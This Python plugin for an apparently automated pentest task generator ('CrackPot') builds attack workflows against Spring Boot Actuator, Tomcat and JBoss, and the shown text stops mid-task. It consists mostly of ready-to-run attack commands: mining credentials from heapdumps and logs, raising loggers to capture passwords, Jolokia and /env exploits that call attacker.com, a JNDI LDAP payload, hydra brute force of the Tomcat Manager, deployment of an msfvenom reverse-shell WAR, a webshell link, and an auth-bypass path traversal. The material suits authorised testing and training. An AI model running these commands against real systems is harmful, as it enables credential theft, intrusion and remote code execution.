"""
Spring Boot / Tomcat service enumeration plugin

Generates tasks for Spring Boot and Tomcat enumeration including:
- Spring Boot Actuator endpoint discovery and exploitation
- Tomcat Manager authentication and WAR deployment
- Heapdump secret mining (credentials, tokens, internal URLs)
- Actuator logger manipulation for credential harvesting
- JSP web shell deployment
- JBoss management console exploitation

Extracted from HackTricks:
- spring-actuators.md
- tomcat/README.md
- jsp.md
- jboss.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class SpringBootPlugin(ServicePlugin):
    """Spring Boot, Tomcat, and JBoss enumeration plugin"""

    @property
    def name(self) -> str:
        return "spring-boot"

    @property
    def default_ports(self) -> List[int]:
        return [8080, 8443, 8009, 8180]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'tomcat', 'jboss', 'java']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect Spring Boot, Tomcat, or JBoss services"""
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        version = port_info.get('version', '').lower()
        port = port_info.get('port')

        # Check for Tomcat/JBoss/Spring indicators in product
        java_indicators = ['tomcat', 'apache tomcat', 'jboss', 'spring']
        if any(indicator in product for indicator in java_indicators):
            return True

        # Check version string
        if any(indicator in version for indicator in java_indicators):
            return True

        # Check for Java web server on common ports
        if port in self.default_ports and service in ['http', 'https']:
            return True

        return False


    def detect_from_finding(self, finding: Dict[str, Any], profile=None) -> int:
        """Detect Spring Boot/Tomcat from technology findings"""
        from ..core.constants import FindingTypes
        import logging
        logger = logging.getLogger(__name__)

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # Perfect match - Spring framework detected
        if finding_type in [FindingTypes.FRAMEWORK_SPRING, FindingTypes.TECH_JAVA]:
            logger.info("Spring Boot plugin activating: Framework detected")
            return 100

        # High confidence - Spring/Tomcat indicators
        spring_indicators = ['spring', 'actuator', 'tomcat', 'apache tomcat',
                             'jboss', '/actuator/', 'spring boot']
        if any(ind in description for ind in spring_indicators):
            logger.info(f"Spring plugin activating: Found '{description[:50]}'")
            return 90

        return 0

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Spring Boot / Tomcat enumeration task tree"""
        version = service_info.get('version', 'unknown')
        product = service_info.get('product', 'Tomcat')

        base_url = f"http://{target}:{port}" if port != 443 else f"https://{target}:{port}"

        tasks = {
            'id': f'spring-boot-enum-{port}',
            'name': f'Spring Boot / Tomcat Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: Spring Boot Actuator Discovery
        tasks['children'].append({
            'id': f'actuator-discovery-{port}',
            'name': 'Spring Boot Actuator Discovery',
            'type': 'parent',
            'children': [
                {
                    'id': f'actuator-check-{port}',
                    'name': 'Check Common Actuator Endpoints',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {base_url}/actuator | jq .',
                        'description': 'Discover exposed Spring Boot Actuator endpoints (Spring Boot 2.x)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM', 'MANUAL'],
                        'flag_explanations': {
                            'curl': 'HTTP client for making requests',
                            '-s': 'Silent mode (no progress bar)',
                            '/actuator': 'Spring Boot 2.x base path for actuator endpoints',
                            'jq .': 'Format JSON output for readability'
                        },
                        'success_indicators': [
                            'JSON response with _links object',
                            'Endpoints like /actuator/env, /actuator/health visible',
                            'HTTP 200 response'
                        ],
                        'failure_indicators': [
                            'HTTP 404 Not Found (not Spring Boot)',
                            'HTTP 401 Unauthorized (authentication required)',
                            'Empty response (actuators disabled)',
                            'Connection refused'
                        ],
                        'next_steps': [
                            'Test Spring Boot 1.x endpoints (no /actuator prefix)',
                            'Try common endpoints: /env, /health, /trace, /beans',
                            'Check heapdump: /actuator/heapdump',
                            'Test logfile access: /actuator/logfile'
                        ],
                        'alternatives': [
                            f'Manual: curl -s {base_url}/env',
                            f'Manual: curl -s {base_url}/health',
                            f'Manual: curl -s {base_url}/actuator/env',
                            'Browser: Visit endpoints manually',
                            f'gobuster dir -u {base_url} -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt'
                        ],
                        'notes': 'Spring Boot 1.x: endpoints at root (e.g., /env). Spring Boot 2.x: under /actuator/ prefix. From version 1.5+, only /health and /info are non-sensitive by default, but developers often disable security.',
                        'estimated_time': '1-2 minutes'
                    }
                },
                {
                    'id': f'actuator-wordlist-{port}',
                    'name': 'Brute-force Actuator Endpoints',
                    'type': 'command',
                    'metadata': {
                        'command': f'gobuster dir -u {base_url} -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -b 404,403',
                        'description': 'Discover hidden/misconfigured actuator endpoints using Spring-focused wordlist',
                        'tags': ['OSCP:HIGH', 'ENUM', 'AUTOMATED'],
                        'flag_explanations': {
                            'dir': 'Directory/file brute-forcing mode',
                            '-u': 'Target base URL',
                            '-w': 'Wordlist path (spring-boot.txt = 200+ Spring endpoints)',
                            '-b': 'Blacklist status codes to ignore (404=not found, 403=forbidden)'
                        },
                        'success_indicators': [
                            'Status 200/301/302 responses found',
                            'Endpoints like /actuator/heapdump, /jolokia, /env discovered',
                            'Multiple actuator paths revealed'
                        ],
                        'failure_indicators': [
                            'All 404 responses (not Spring Boot)',
                            'All 403 responses (firewall/WAF blocking)',
                            'Rate limiting errors'
                        ],
                        'next_steps': [
                            'Prioritize testing: /heapdump, /env, /jolokia, /logfile',
                            'Test POST methods on /env, /restart, /shutdown',
                            'Check /mappings for route discovery',
                            'Access /beans for Spring configuration details'
                        ],
                        'alternatives': [
                            f'Manual: Test common endpoints one-by-one with curl',
                            f'ffuf -u {base_url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt',
                            'wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/spring-boot.txt --hc 404'
                        ],
                        'notes': 'SecLists spring-boot.txt contains 200+ default actuators. Always check: /actuator/heapdump (secrets), /actuator/env (config), /jolokia (RCE vector), /actuator/logfile (creds).',
                        'estimated_time': '3-5 minutes'
                    }
                }
            ]
        })

        # TASK 2: Heapdump Secret Mining
        tasks['children'].append({
            'id': f'heapdump-mining-{port}',
            'name': 'Heapdump Secret Mining',
            'type': 'parent',
            'children': [
                {
                    'id': f'heapdump-download-{port}',
                    'name': 'Download Heapdump',
                    'type': 'command',
                    'metadata': {
                        'command': f'wget {base_url}/actuator/heapdump -O heapdump_{target}_{port}.hprof',
                        'description': 'Download full JVM heap snapshot (contains live secrets: DB creds, API keys, tokens)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'CREDS'],
                        'flag_explanations': {
                            'wget': 'Download file from URL',
                            '/actuator/heapdump': 'Spring Boot 2.x heapdump endpoint',
                            '-O': 'Output filename (heapdump_<target>_<port>.hprof)'
                        },
                        'success_indicators': [
                            'Large file downloaded (50MB-2GB+)',
                            'File extension .hprof (Java heap dump)',
                            'HTTP 200 response'
                        ],
                        'failure_indicators': [
                            'HTTP 404 (endpoint disabled)',
                            'HTTP 401 (authentication required)',
                            'Small file size (<1MB = likely error)',
                            'Connection timeout'
                        ],
                        'next_steps': [
                            'Quick triage with strings and grep',
                            'Deep analysis with VisualVM',
                            'Automated extraction with JDumpSpider',
                            'Search for: DB credentials, API keys, Basic Auth headers'
                        ],
                        'alternatives': [
                            f'Manual: curl -s {base_url}/actuator/heapdump -o heapdump.hprof',
                            f'Spring Boot 1.x: wget {base_url}/heapdump -O heapdump.hprof',
                            'Browser: Download directly from endpoint'
                        ],
                        'notes': 'Heapdumps frequently contain: DB creds in DataSourceProperties, Basic Auth in URLs (Eureka defaultZone), API keys in OriginTrackedMapPropertySource, session tokens. Try credentials on SSH/MySQL/adjacent services.',
                        'estimated_time': '2-5 minutes (depends on heap size)'
                    }
                },
                {
                    'id': f'heapdump-strings-{port}',
                    'name': 'Quick Triage: Strings Analysis',
                    'type': 'command',
                    'metadata': {
                        'command': f'strings -a heapdump_{target}_{port}.hprof | grep -nE "Authorization: Basic|jdbc:|password=|spring\\.datasource|eureka\\.client|api[_-]?key|secret[_-]?key" | head -50',
                        'description': 'Fast grep for common credential patterns in heapdump',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'CREDS', 'MANUAL'],
                        'flag_explanations': {
                            'strings': 'Extract printable strings from binary file',
                            '-a': 'Scan entire file (default only scans data sections)',
                            'grep -nE': 'Search with regex, show line numbers',
                            'Authorization: Basic': 'HTTP Basic Auth headers (Base64-encoded)',
                            'jdbc:': 'JDBC connection strings (contain DB creds)',
                            'password=': 'Password parameters in URLs/configs',
                            'spring.datasource': 'Spring database configuration properties',
                            'eureka.client': 'Eureka service discovery URLs (often contain Basic Auth)',
                            'api[_-]?key': 'API key patterns',
                            'secret[_-]?key': 'Secret key patterns',
                            'head -50': 'Show first 50 matches only'
                        },
                        'success_indicators': [
                            'Authorization: Basic <base64> headers found',
                            'jdbc:mysql://user:password@host/db connection strings',
                            'password=<plaintext> in URLs',
                            'API keys in format: api_key=xxx or apiKey: xxx',
                            'Eureka URLs like http://user:pass@eureka:8761/eureka/'
                        ],
                        'failure_indicators': [
                            'No matches (heap may not contain creds)',
                            'Only encrypted/hashed values found',
                            'File not found error'
                        ],
                        'next_steps': [
                            'Decode Basic Auth: echo <base64> | base64 -d',
                            'Test JDBC credentials: mysql -h <host> -u <user> -p<password>',
                            'Try credentials on SSH: ssh user@target',
                            'Test on adjacent services (admin panels, APIs)',
                            'Search for internal URLs and access them'
                        ],
                        'alternatives': [
                            'Manual Base64 decode: printf %s "RXhhbXBsZUJhc2U2NEhlcmU=" | base64 -d',
                            'GUI analysis: Open in VisualVM → Browse instances → java.lang.String',
                            'Automated: java -jar JDumpSpider.jar heapdump.hprof'
                        ],
                        'notes': 'Common findings: HikariDataSource (DB pool creds), OriginTrackedMapPropertySource (Spring config), Authorization headers in captured HTTP requests. Credentials from heapdump often work for system users (SSH), so try broadly.',
                        'estimated_time': '1-2 minutes'
                    }
                },
                {
                    'id': f'heapdump-jdumpspider-{port}',
                    'name': 'Automated Extraction: JDumpSpider',
                    'type': 'command',
                    'metadata': {
                        'command': f'java -jar /opt/JDumpSpider/JDumpSpider.jar heapdump_{target}_{port}.hprof',
                        'description': 'Automated heapdump analysis with JDumpSpider (extracts passwords, URLs, keys)',
                        'tags': ['OSCP:MEDIUM', 'CREDS', 'AUTOMATED'],
                        'flag_explanations': {
                            'java -jar': 'Execute Java JAR file',
                            'JDumpSpider.jar': 'Automated heapdump secret extractor',
                            'heapdump.hprof': 'Input heapdump file'
                        },
                        'success_indicators': [
                            'Passwords extracted and displayed',
                            'JDBC URLs with credentials',
                            'API keys discovered',
                            'Internal service URLs revealed'
                        ],
                        'failure_indicators': [
                            'Tool not installed',
                            'Out of memory error (heap too large)',
                            'No secrets found'
                        ],
                        'next_steps': [
                            'Test extracted credentials on all services',
                            'Document findings with source attribution',
                            'Check internal URLs for additional access'
                        ],
                        'alternatives': [
                            'VisualVM: Open heapdump → OQL Console → Run queries',
                            'Manual strings grep (see Quick Triage task)',
                            'Eclipse MAT (Memory Analyzer Tool)'
                        ],
                        'notes': 'Install JDumpSpider: git clone https://github.com/whwlsfb/JDumpSpider && cd JDumpSpider && mvn clean package. Look for: DataSourceProperties, HikariDataSource, OriginTrackedMapPropertySource objects.',
                        'estimated_time': '5-10 minutes'
                    }
                }
            ]
        })

        # TASK 3: Actuator Logger Manipulation
        tasks['children'].append({
            'id': f'actuator-logger-{port}',
            'name': 'Actuator Logger Credential Harvesting',
            'type': 'parent',
            'children': [
                {
                    'id': f'logger-enum-{port}',
                    'name': 'Enumerate Available Loggers',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {base_url}/actuator/loggers | jq \'.loggers | to_entries[] | select(.key | test("spring|security")) | {{logger: .key, level: .value.effectiveLevel}}\'',
                        'description': 'List Spring/Security loggers and current log levels',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'MANUAL'],
                        'flag_explanations': {
                            'curl -s': 'Silent HTTP request',
                            '/actuator/loggers': 'Spring Boot logger management endpoint',
                            'jq': 'JSON processor for filtering output',
                            '.loggers': 'Extract loggers object',
                            'to_entries[]': 'Convert object to key-value pairs',
                            'select(.key | test("spring|security"))': 'Filter to Spring/Security loggers only',
                            '{logger: .key, level: .value.effectiveLevel}': 'Format output'
                        },
                        'success_indicators': [
                            'Logger list displayed',
                            'Log levels shown (INFO, DEBUG, TRACE, etc.)',
                            'Spring Security loggers present'
                        ],
                        'failure_indicators': [
                            'HTTP 404 (endpoint disabled)',
                            'HTTP 401 (authentication required)',
                            'Empty response'
                        ],
                        'next_steps': [
                            'Increase log level to TRACE for authentication packages',
                            'Find log file location via /actuator/env',
                            'Monitor logs for credential leakage',
                            'Reset log levels when done'
                        ],
                        'alternatives': [
                            f'Manual: curl -s {base_url}/actuator/loggers | jq .',
                            'Browser: Visit /actuator/loggers and search manually'
                        ],
                        'notes': 'Target loggers: org.springframework.security (auth), org.springframework.web (requests), org.springframework.cloud.gateway (microservices). Higher verbosity = more credential leakage.',
                        'estimated_time': '1-2 minutes'
                    }
                },
                {
                    'id': f'logger-trace-{port}',
                    'name': 'Enable TRACE Logging for Auth Packages',
                    'type': 'command',
                    'metadata': {
                        'command': f'''curl -s -X POST {base_url}/actuator/loggers/org.springframework.security -H 'Content-Type: application/json' -d '{{"configuredLevel":"TRACE"}}' && curl -s -X POST {base_url}/actuator/loggers/org.springframework.web -H 'Content-Type: application/json' -d '{{"configuredLevel":"TRACE"}}'  ''',
                        'description': 'Crank up log verbosity to capture credentials in login flows',
                        'tags': ['OSCP:HIGH', 'CREDS', 'EXPLOIT'],
                        'flag_explanations': {
                            'curl -X POST': 'HTTP POST request',
                            '/actuator/loggers/<logger>': 'Logger configuration endpoint',
                            '-H Content-Type: application/json': 'JSON request body',
                            '{"configuredLevel":"TRACE"}': 'Set log level to TRACE (most verbose)',
                            'org.springframework.security': 'Authentication/authorization logger',
                            'org.springframework.web': 'Web request/response logger'
                        },
                        'success_indicators': [
                            'HTTP 200/204 response (no error)',
                            'Subsequent requests show verbose logs',
                            'Credentials visible in log output'
                        ],
                        'failure_indicators': [
                            'HTTP 404 (endpoint disabled)',
                            'HTTP 401 (authentication required)',
                            'HTTP 405 Method Not Allowed (POST disabled)'
                        ],
                        'next_steps': [
                            'Access logs via /actuator/logfile',
                            'Trigger authentication traffic (login attempts)',
                            'Parse logs for credentials: grep -E "Authorization:|username=|password="',
                            'Reset log levels: POST /actuator/loggers/<logger> with {"configuredLevel": null}'
                        ],
                        'alternatives': [
                            'Manual individual requests: curl -X POST ... for each logger',
                            'Also enable: org.springframework.cloud.gateway logger',
                            'If /actuator/httpexchanges exposed, check recent request metadata'
                        ],
                        'notes': 'TRACE level makes headers and form bodies visible in logs. In microservice setups with gateway fronting auth, this captures credentials in transit. Some environments generate synthetic login traffic periodically, making harvesting trivial once logging is verbose. Always reset when done!',
                        'estimated_time': '2-3 minutes'
                    }
                },
                {
                    'id': f'logfile-harvest-{port}',
                    'name': 'Harvest Credentials from Logs',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {base_url}/actuator/logfile | strings | grep -nE "Authorization:|username=|password=|Bearer |api[_-]?key" | tail -100',
                        'description': 'Extract credentials from exposed log files',
                        'tags': ['OSCP:HIGH', 'CREDS', 'QUICK_WIN'],
                        'flag_explanations': {
                            'curl -s': 'Silent HTTP request',
                            '/actuator/logfile': 'Endpoint exposing application logs',
                            'strings': 'Extract printable text',
                            'grep -nE': 'Search with regex, show line numbers',
                            'Authorization:': 'HTTP auth headers (Basic/Bearer)',
                            'username=': 'Username parameters',
                            'password=': 'Password parameters',
                            'Bearer ': 'JWT/OAuth tokens',
                            'tail -100': 'Show last 100 matches (most recent)'
                        },
                        'success_indicators': [
                            'Authorization: Basic <base64> headers',
                            'username=admin&password=secret in logs',
                            'Bearer tokens visible',
                            'API keys in request logs'
                        ],
                        'failure_indicators': [
                            'HTTP 404 (logfile not exposed)',
                            'Empty log file',
                            'No credentials found (low log level)'
                        ],
                        'next_steps': [
                            'Decode Base64 auth: echo <base64> | base64 -d',
                            'Test credentials on target services',
                            'Extract JWT tokens and decode: jwt_tool <token>',
                            'Document findings with source'
                        ],
                        'alternatives': [
                            'Query log path: curl -s {base_url}/actuator/env | jq \'.propertySources[].properties | to_entries[] | select(.key|test("^logging\\\\.(file|path)"))\'',
                            'If log path known, try direct file access: curl http://target/logs/application.log',
                            'Use /actuator/httpexchanges for recent request metadata'
                        ],
                        'notes': 'After enabling TRACE logging, wait for authentication traffic or trigger login attempts yourself. Logs may also contain internal service credentials from microservice communication.',
                        'estimated_time': '3-5 minutes'
                    }
                }
            ]
        })

        # TASK 4: Jolokia RCE
        tasks['children'].append({
            'id': f'jolokia-rce-{port}',
            'name': 'Jolokia Remote Code Execution',
            'type': 'parent',
            'children': [
                {
                    'id': f'jolokia-check-{port}',
                    'name': 'Check Jolokia Endpoint',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {base_url}/jolokia/version | jq .',
                        'description': 'Test if Jolokia JMX-over-HTTP bridge is exposed',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                        'flag_explanations': {
                            'curl -s': 'Silent HTTP request',
                            '/jolokia/version': 'Jolokia version endpoint',
                            'jq .': 'Format JSON output'
                        },
                        'success_indicators': [
                            'JSON response with Jolokia version',
                            'Agent type and protocol version displayed',
                            'HTTP 200 response'
                        ],
                        'failure_indicators': [
                            'HTTP 404 (Jolokia not present)',
                            'HTTP 401 (authentication required)',
                            'Connection refused'
                        ],
                        'next_steps': [
                            'Exploit reloadByURL for XXE/RCE',
                            'List available MBeans: /jolokia/list',
                            'Research CVEs for detected Jolokia version'
                        ],
                        'alternatives': [
                            f'Manual: curl -s {base_url}/jolokia/list',
                            'Browser: Visit /jolokia/version directly',
                            'Also check: /actuator/jolokia (Spring Boot 2.x)'
                        ],
                        'notes': 'Jolokia exposes JMX MBeans over HTTP. The ch.qos.logback.classic.jmx.JMXConfigurator MBean has reloadByURL action that can load logging config from external URL → blind XXE or RCE via crafted XML.',
                        'estimated_time': '1 minute'
                    }
                },
                {
                    'id': f'jolokia-exploit-{port}',
                    'name': 'Exploit: reloadByURL RCE',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s "{base_url}/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker.com!/logback.xml"',
                        'description': 'Trigger XXE/RCE by loading malicious Logback XML from external URL',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'RCE'],
                        'flag_explanations': {
                            '/jolokia/exec': 'Execute MBean operation',
                            'ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator': 'Logback JMX MBean',
                            'reloadByURL': 'Action to reload logging config from URL',
                            'http:!/!/attacker.com!/logback.xml': 'External URL (Jolokia uses !/! as slash replacement)'
                        },
                        'success_indicators': [
                            'HTTP 200 response',
                            'Request to attacker-controlled server received',
                            'XXE payload executed (blind confirmation)',
                            'RCE gadget triggered (reverse shell)'
                        ],
                        'failure_indicators': [
                            'HTTP 404 (MBean not found)',
                            'HTTP 401 (authentication required)',
                            'No callback received on attacker server',
                            'MBean operation disabled'
                        ],
                        'next_steps': [
                            'Host malicious logback.xml with XXE payload',
                            'Or: Load RCE gadget via JNDI injection',
                            'Listen for callback: python3 -m http.server 80',
                            'Reference: https://www.veracode.com/blog/research/exploiting-spring-boot-actuators'
                        ],
                        'alternatives': [
                            'Manual XXE payload crafting',
                            'JNDI injection via rogue LDAP server',
                            'Research other exposed MBeans for exploitation'
                        ],
                        'notes': 'Malicious logback.xml can contain XXE to read files or JNDI references for RCE. Example: <configuration><insertFromJNDI env-entry-name="ldap://attacker:1389/Exploit" /></configuration>. Requires Jolokia + Logback with JMX enabled.',
                        'estimated_time': '10-15 minutes (setup required)'
                    }
                }
            ]
        })

        # TASK 5: /env Config Manipulation
        tasks['children'].append({
            'id': f'env-manipulation-{port}',
            'name': '/env Config Manipulation',
            'type': 'parent',
            'children': [
                {
                    'id': f'env-read-{port}',
                    'name': 'Read Environment Configuration',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {base_url}/actuator/env | jq \'.propertySources[].properties | to_entries[] | select(.value.value != null) | {{key: .key, value: .value.value}}\'',
                        'description': 'Extract Spring configuration properties (DB creds, API keys, internal URLs)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM', 'CREDS'],
                        'flag_explanations': {
                            'curl -s': 'Silent HTTP request',
                            '/actuator/env': 'Spring Boot environment properties endpoint',
                            'jq': 'JSON processor',
                            '.propertySources[].properties': 'Extract all property sources',
                            'select(.value.value != null)': 'Filter out null values',
                            '{key: .key, value: .value.value}': 'Format key-value pairs'
                        },
                        'success_indicators': [
                            'Database URLs with credentials visible',
                            'API keys and secrets exposed',
                            'Internal service URLs revealed',
                            'AWS keys, tokens discovered'
                        ],
                        'failure_indicators': [
                            'HTTP 404 (endpoint disabled)',
                            'HTTP 401 (authentication required)',
                            'Sensitive properties masked: ******'
                        ],
                        'next_steps': [
                            'Extract DB credentials: grep -E "datasource|jdbc"',
                            'Find API keys: grep -E "api[._-]?key|secret"',
                            'Test credentials on target services',
                            'Document all findings with sources'
                        ],
                        'alternatives': [
                            f'Manual: curl -s {base_url}/actuator/env | jq . | less',
                            f'Spring Boot 1.x: curl -s {base_url}/env',
                            'Also check: /actuator/configprops for configuration beans'
                        ],
                        'notes': 'Common findings: spring.datasource.url/username/password (DB creds), eureka.client.serviceUrl.defaultZone (microservice registry, often has Basic Auth in URL), AWS credentials, SMTP passwords. Credentials work on adjacent services 80% of the time.',
                        'estimated_time': '2-3 minutes'
                    }
                },
                {
                    'id': f'env-post-{port}',
                    'name': 'POST to /env (XStream Deserialization)',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -X POST {base_url}/actuator/env -H "Content-Type: application/json" -d \'{{"name":"eureka.client.serviceUrl.defaultZone","value":"http://attacker.com/xstream"}}\'',
                        'description': 'Modify environment properties to exploit XStream deserialization in Eureka',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'RCE'],
                        'flag_explanations': {
                            'curl -X POST': 'HTTP POST request',
                            '/actuator/env': 'Environment modification endpoint',
                            '-H Content-Type: application/json': 'JSON request body',
                            'eureka.client.serviceUrl.defaultZone': 'Eureka service registry URL property',
                            'http://attacker.com/xstream': 'Malicious Eureka server with XStream payload'
                        },
                        'success_indicators': [
                            'HTTP 200/204 response',
                            'Property updated successfully',
                            'Request to attacker server received',
                            'XStream deserialization triggered'
                        ],
                        'failure_indicators': [
                            'HTTP 404 (endpoint disabled)',
                            'HTTP 405 Method Not Allowed (POST disabled)',
                            'Property is read-only',
                            'Spring Cloud Libraries not present'
                        ],
                        'next_steps': [
                            'Trigger property reload: POST /actuator/refresh',
                            'Or: POST /actuator/restart',
                            'Host malicious Eureka server with XStream payload',
                            'Reference: https://www.veracode.com/blog/research/exploiting-spring-boot-actuators'
                        ],
                        'alternatives': [
                            'Spring Boot 1.x: POST to /env (application/x-www-form-urlencoded)',
                            'Other exploitable properties: spring.datasource.tomcat.validationQuery (SQL injection)',
                            'spring.datasource.tomcat.url (JDBC attack)'
                        ],
                        'notes': 'Requires Spring Cloud Libraries. XStream deserialization in Eureka client when it parses malicious registry response. Need to trigger refresh/restart for property to take effect. Modern versions patch this (CVE-2020-5405).',
                        'estimated_time': '15-20 minutes (complex setup)'
                    }
                }
            ]
        })

        # TASK 6: Tomcat Manager
        tasks['children'].append({
            'id': f'tomcat-manager-{port}',
            'name': 'Tomcat Manager Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': f'tomcat-version-{port}',
                    'name': 'Identify Tomcat Version',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {base_url}/docs/ | grep -oP "Apache Tomcat/[0-9\\.]+" | head -1',
                        'description': 'Extract Tomcat version from documentation page',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM', 'MANUAL'],
                        'flag_explanations': {
                            'curl -s': 'Silent HTTP request',
                            '/docs/': 'Tomcat documentation index',
                            'grep -oP': 'Extract only matching pattern (Perl regex)',
                            '"Apache Tomcat/[0-9\\.]+"': 'Match version string',
                            'head -1': 'Show first match only'
                        },
                        'success_indicators': [
                            'Version string displayed: Apache Tomcat/X.Y.Z',
                            'HTTP 200 response'
                        ],
                        'failure_indicators': [
                            'HTTP 404 (/docs not present)',
                            'No version string in response',
                            'Custom error page'
                        ],
                        'next_steps': [
                            'Search for version-specific CVEs',
                            'Check for /examples vulnerability',
                            'Attempt manager authentication',
                            'Test path traversal: /..;/manager/html'
                        ],
                        'alternatives': [
                            'Manual: View page source in browser',
                            'nmap -sV -p {port} {target} (banner grab)',
                            'whatweb {base_url}',
                            'curl -s {base_url}/manager/status (may show version)'
                        ],
                        'notes': 'Tomcat version is critical for CVE mapping. Versions 4.x-7.x have example scripts vulnerable to XSS/info disclosure. Versions <6 allow username enumeration.',
                        'estimated_time': '1 minute'
                    }
                },
                {
                    'id': f'tomcat-manager-bruteforce-{port}',
                    'name': 'Brute-force Manager Credentials',
                    'type': 'command',
                    'metadata': {
                        'command': f'hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt {target} -s {port} http-get /manager/html',
                        'description': 'Brute-force Tomcat Manager with default credentials',
                        'tags': ['OSCP:HIGH', 'BRUTE_FORCE', 'AUTOMATED'],
                        'flag_explanations': {
                            'hydra': 'Network login brute-forcer',
                            '-C': 'Colon-separated username:password list',
                            'tomcat-betterdefaultpasslist.txt': 'Tomcat default credentials (admin:admin, tomcat:tomcat, etc.)',
                            '-s': 'Target port',
                            'http-get': 'HTTP GET with Basic Auth',
                            '/manager/html': 'Tomcat Manager GUI (requires auth)'
                        },
                        'success_indicators': [
                            'Valid credentials found: [80][http-get] host: 10.10.10.64 login: admin password: admin',
                            'HTTP 200 response',
                            'Manager page accessible'
                        ],
                        'failure_indicators': [
                            'All attempts failed (non-default creds)',
                            'Account lockout triggered',
                            'Rate limiting'
                        ],
                        'next_steps': [
                            'Access Manager: /manager/html',
                            'Upload WAR file for RCE',
                            'Check /manager/status for version info',
                            'Enumerate deployed applications'
                        ],
                        'alternatives': [
                            'Metasploit: use auxiliary/scanner/http/tomcat_mgr_login',
                            f'Manual test: curl -u admin:admin {base_url}/manager/html',
                            'Common creds: admin:admin, tomcat:tomcat, admin:s3cr3t, admin:tomcat',
                            'Custom wordlist: hydra -L users.txt -P passwords.txt ...'
                        ],
                        'notes': 'Manager allows WAR deployment = RCE. Default creds still common in lab environments. Tomcat <6: username enumeration via auxiliary/scanner/http/tomcat_enum. For /manager/text API, use manager-script role.',
                        'estimated_time': '5-10 minutes'
                    }
                },
                {
                    'id': f'tomcat-war-rce-{port}',
                    'name': 'Deploy WAR for RCE',
                    'type': 'command',
                    'metadata': {
                        'command': f'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o revshell.war && curl --upload-file revshell.war -u "admin:admin" "{base_url}/manager/text/deploy?path=/revshell"',
                        'description': 'Create malicious WAR file and deploy via Manager for reverse shell',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'RCE'],
                        'flag_explanations': {
                            'msfvenom': 'Metasploit payload generator',
                            '-p java/jsp_shell_reverse_tcp': 'Java/JSP reverse shell payload',
                            'LHOST=<LHOST>': 'Attacker IP for callback',
                            'LPORT=<LPORT>': 'Attacker port for listener',
                            '-f war': 'Output format: WAR (Web Application Archive)',
                            '-o revshell.war': 'Output filename',
                            'curl --upload-file': 'Upload file via HTTP PUT',
                            '-u "admin:admin"': 'Basic Auth credentials',
                            '/manager/text/deploy': 'Manager API deploy endpoint',
                            '?path=/revshell': 'Deployment context path'
                        },
                        'success_indicators': [
                            'WAR uploaded successfully',
                            'Application deployed: OK - Deployed application at context path /revshell',
                            'Reverse shell callback received',
                            'Shell access gained'
                        ],
                        'failure_indicators': [
                            'HTTP 401 (wrong credentials)',
                            'HTTP 403 (insufficient privileges - need manager-script role)',
                            'Upload failed',
                            'No callback (firewall blocking)'
                        ],
                        'next_steps': [
                            'Start listener: nc -lvnp <LPORT>',
                            'Trigger payload: curl {base_url}/revshell/',
                            'Post-exploitation: enumerate system, escalate privileges',
                            'Cleanup: curl -u admin:admin "{base_url}/manager/text/undeploy?path=/revshell"'
                        ],
                        'alternatives': [
                            'Metasploit: use exploit/multi/http/tomcat_mgr_upload',
                            'Manual JSP webshell: Create index.jsp, jar -cvf shell.war index.jsp, upload via GUI',
                            'tomcatWarDeployer.py: ./tomcatWarDeployer.py -U admin -P admin -H <LHOST> -p <LPORT> {target}:{port}/manager/html/',
                            'Clusterd: clusterd.py -i {target} -a tomcat --gen-payload <LHOST>:<LPORT> --deploy shell.war --invoke'
                        ],
                        'notes': 'Requires manager-script, manager, or admin role (check tomcat-users.xml). WAR deployment is instant RCE. For manual webshell: use cmd.jsp from https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp. Access deployed app at /{path}/ (trailing slash important).',
                        'estimated_time': '5-10 minutes'
                    }
                }
            ]
        })

        # TASK 7: Tomcat Path Traversal
        tasks['children'].append({
            'id': f'tomcat-path-traversal-{port}',
            'name': 'Tomcat Path Traversal',
            'type': 'parent',
            'children': [
                {
                    'id': f'path-traversal-semicolon-{port}',
                    'name': 'Path Traversal: /..;/ Bypass',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s -u ":" {base_url}/..;/manager/html',
                        'description': 'Bypass authentication using /..;/ path traversal (vulnerable Tomcat configs)',
